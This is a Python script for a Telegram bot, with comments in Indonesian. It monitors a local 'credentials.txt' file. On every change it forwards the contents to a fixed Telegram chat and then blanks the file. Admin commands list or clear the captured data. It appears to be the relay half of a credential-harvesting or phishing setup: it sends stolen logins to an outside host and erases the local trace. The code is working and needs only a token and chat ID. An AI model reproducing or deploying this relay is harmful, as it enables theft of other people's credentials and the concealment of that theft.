import time
import telebot
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import os

# --- GANTI DENGAN TOKEN DAN CHAT ID MILIKMU ---
BOT_TOKEN = 'tambahin_pake_id_token_lu_bangke'
CHAT_ID = 'chat_id'

#pemilik bot ya bangke ganti no nya pake chat id pemilik bot (ini no ngawur ganti sendiri jangan malas)
OWNER_ID = 677899755 

ADMIN_FILE = 'admins.txt'
admin_ids = set()

def load_admins():
    if os.path.exists(ADMIN_FILE):
        with open(ADMIN_FILE, 'r') as f:
            for line in f:
                try:
                    admin_ids.add(int(line.strip()))
                except ValueError:
                    pass
    if OWNER_ID not in admin_ids:
        admin_ids.add(OWNER_ID)
        save_admins()

def save_admins():
    with open(ADMIN_FILE, 'w') as f:
        for admin_id in admin_ids:
            f.write(str(admin_id) + '\n')

bot = telebot.TeleBot(BOT_TOKEN)

def send_file_content(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
        
        if content:
            bot.send_message(CHAT_ID, f"Perubahan terdeteksi di credentials.txt:\n\n{content}")
            print("Pesan berhasil dikirim ke Telegram!")
            
            with open(file_path, 'w') as file:
                file.write("")
            print("Isi file credentials.txt sudah dikosongkan.")
            
    except FileNotFoundError:
        print("File tidak ditemukan.")
    except Exception as e:
        print(f"Terjadi kesalahan saat mengirim pesan: {e}")

# Fungsi untuk menambahkan admin baru
@bot.message_handler(commands=['add'])
def add_admin_command(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "Maaf, hanya pemilik bot yang bisa menambahkan admin baru.")
        return

    try:
        new_admin_id = int(message.text.split()[1])
        if new_admin_id in admin_ids:
            bot.send_message(message.chat.id, "ID ini sudah terdaftar sebagai admin.")
            return

        admin_ids.add(new_admin_id)
        save_admins()
        bot.send_message(message.chat.id, f"ID {new_admin_id} berhasil ditambahkan sebagai admin.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Format salah. Gunakan: /addadmin [ID_PENGGUNA]")

# Fungsi untuk menghapus admin
@bot.message_handler(commands=['unadd'])
def remove_admin_command(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "Maaf, hanya pemilik bot yang bisa menghapus admin.")
        return
        
    try:
        admin_to_remove = int(message.text.split()[1])
        if admin_to_remove == OWNER_ID:
            bot.send_message(message.chat.id, "Kamu tidak bisa menghapus diri sendiri dari daftar admin.")
            return
            
        if admin_to_remove in admin_ids:
            admin_ids.remove(admin_to_remove)
            save_admins()
            bot.send_message(message.chat.id, f"ID {admin_to_remove} berhasil dihapus dari daftar admin.")
        else:
            bot.send_message(message.chat.id, "ID tersebut tidak ditemukan dalam daftar admin.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Format salah. Gunakan: /removeadmin [ID_PENGGUNA]")
        
@bot.message_handler(commands=['d'])
def delete_file_command(message):
    if message.from_user.id not in admin_ids:
        bot.send_message(message.chat.id, "Maaf, kamu tidak punya akses untuk perintah ini.")
        return
    
    file_path_to_delete = 'credentials.txt'
    if os.path.exists(file_path_to_delete):
        try:
            with open(file_path_to_delete, 'w') as file:
                file.write("")
            bot.send_message(message.chat.id, f"Isi dari file '{file_path_to_delete}' berhasil dikosongkan.")
            print(f"Isi file '{file_path_to_delete}' berhasil dikosongkan.")
        except Exception as e:
            bot.send_message(message.chat.id, f"Gagal mengosongkan file. Error: {e}")
    else:
        bot.send_message(message.chat.id, f"File '{file_path_to_delete}' tidak ditemukan.")
        
@bot.message_handler(commands=['ls'])
def list_file_content(message):
    if message.from_user.id not in admin_ids:
        bot.send_message(message.chat.id, "Maaf, kamu tidak punya akses untuk perintah ini.")
        return

    file_path_to_read = 'credentials.txt'
    if os.path.exists(file_path_to_read):
        with open(file_path_to_read, 'r') as file:
            content = file.read()
        if content:
            bot.send_message(message.chat.id, f"Isi credentials.txt:\n\n{content}")
        else:
            bot.send_message(message.chat.id, "File credentials.txt kosong.")
    else:
        bot.send_message(message.chat.id, "File credentials.txt tidak ditemukan.")


@bot.message_handler(commands=['daftar'])
def show_menu(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_ls = telebot.types.KeyboardButton('/ls')
    btn_d = telebot.types.KeyboardButton('/d')
    btn_add = telebot.types.KeyboardButton('/add')
    btn_unadd = telebot.types.KeyboardButton('/unadd')
    
    markup.add(btn_ls, btn_d, btn_add, btn_unadd)
    
    bot.send_message(message.chat.id, "Pilih menu di bawah:", reply_markup=markup)

class MyHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if not event.is_directory and event.src_path.endswith('credentials.txt'):
            print(f"Perubahan terdeteksi pada {event.src_path}. Mengirim pesan...")
            send_file_content(event.src_path)

if __name__ == "__main__":
    load_admins()
    
    path = '.'
    event_handler = MyHandler()
    observer = Observer()
    observer.schedule(event_handler, path, recursive=False)
    observer.start()

    print("Bot monitoring credentials.txt sedang berjalan...")
    print("Tekan Ctrl+C untuk menghentikan.")

    try:
        bot.polling()
        
    except KeyboardInterrupt:
        observer.stop()
    observer.join()
